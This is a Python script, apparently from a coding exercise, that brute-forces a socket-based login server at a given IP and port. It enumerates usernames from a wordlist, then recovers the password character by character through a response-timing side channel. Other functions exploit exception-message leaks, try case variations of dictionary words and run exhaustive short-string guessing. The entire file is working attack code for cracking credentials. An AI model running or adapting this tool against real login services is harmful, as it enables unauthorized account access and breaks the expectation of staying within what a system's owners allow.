import socket
from argparse import ArgumentParser
import itertools
import json
from datetime import datetime


def parse_command_line_args():
    parser = ArgumentParser()
    parser.add_argument(dest = "ip",
                    help='IP address')
    parser.add_argument(dest = "port",
                    help="port")
    args = parser.parse_args()
    return args

def connect(args):
    with socket.socket() as client_socket:
        address = (args.ip, int(args.port))
        client_socket.connect(address)
        login, diff = login_brute_force(client_socket, time=True)
        response, message = time_brute_force(client_socket, login, diff)
    if response == 'Connection success!':
        return message
    else:
        return ''

def login_brute_force(client_socket, time=False):
    with open('H:\\Downloads\\logins.txt', 'r') as logins:
        true_login = ''
        for login in logins:
            login = login.strip()
            message = to_json(login, ' ')
            start = datetime.now()
            response = send_message(message, client_socket)
            finish = datetime.now()
            diff = finish - start
            response = from_json(response)
            if response == 'Wrong login!':
                continue
            elif response == 'Wrong password!':
                true_login = login
                break
        if not time:
            return true_login
        else:
            return true_login, diff

def time_brute_force(client_socket, true_login, diff):
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    alphabet = alpha + alpha.upper() + '0123456789'
    password = ''
    flag = False
    while True:
        for i in alphabet:
            try_password = password + i
            message = to_json(true_login, try_password)
            start = datetime.now()
            response = send_message(message, client_socket)
            finish = datetime.now()
            difference = finish - start
            response = from_json(response)
            if response == 'Connection success!':
                flag = True
                break
            elif response == 'Exception happened during login':
                password = try_password
                continue
            if difference.microseconds >= 90000 and response == 'Wrong password!':
                password = try_password
                continue
        if flag:
            break
    return response, message

def exception_brute_force(client_socket, true_login):
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    alphabet = alpha + alpha.upper() + '0123456789'
    password = ''
    flag = False
    while True:
        for i in alphabet:
            try_password = password + i
            message = to_json(true_login, try_password)
            response = send_message(message, client_socket)
            response = from_json(response)
            if response == 'Connection success!':
                flag = True
                break
            elif response == 'Exception happened during login':
                password = try_password
                continue
        if flag:
            break
    return response, message

def to_json(login, password):
    d = {'login': login, 'password': password}
    return json.dumps(d)

def from_json(response):
    d = json.loads(response)
    return d['result']

def dictionary_brute_force(client_socket):
    with open('H:\\Downloads\\passwords.txt', 'r') as passwords:
        i = 0
        flag = False
        for password in passwords:
                password = password.strip()
                if password.isdigit():
                    i += 1
                    if i >= 1000000:
                        break
                    message = password
                    response = send_message(message, client_socket)
                    if response == 'Connection success!' or response == 'Too many attempts':
                        break
                    else:
                        continue
                my_iter = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in password)))
                for message in my_iter:
                    response = send_message(message, client_socket)
                    if response == 'Connection success!' or response == 'Too many attempts':
                        flag = True
                        break
                    i += 1
                    if i >= 1000000:
                        flag = True
                        break
                if flag:
                    break
    return response, message

def send_message(message, client_socket):
    data = message.encode()  # converting to bytes
    client_socket.send(data)
    response = client_socket.recv(1024)  # buffer size
    response = response.decode()  # decoding from bytes to string
    return response

def brute_force(client_socket):
        alphabet = list('abcdefghijklmnopqrstuvwxyz0123456789')  # 36 symbols
        i = 0
        j = 1
        flag = False
        while True:
            my_iter = itertools.product(alphabet, repeat=j)
            for message in my_iter:
                message = ''.join(message)
                response = send_message(message, client_socket)
                if response == 'Connection success!' or response == 'Too many attempts':
                    flag = True
                    break
                i += 1
                if i >= 1000000:
                    flag = True
                    break
            j += 1
            if flag:
                break
        return response, message

def main():
    args = parse_command_line_args()
    password = connect(args)
    print(password)

if __name__ == '__main__':
    main()
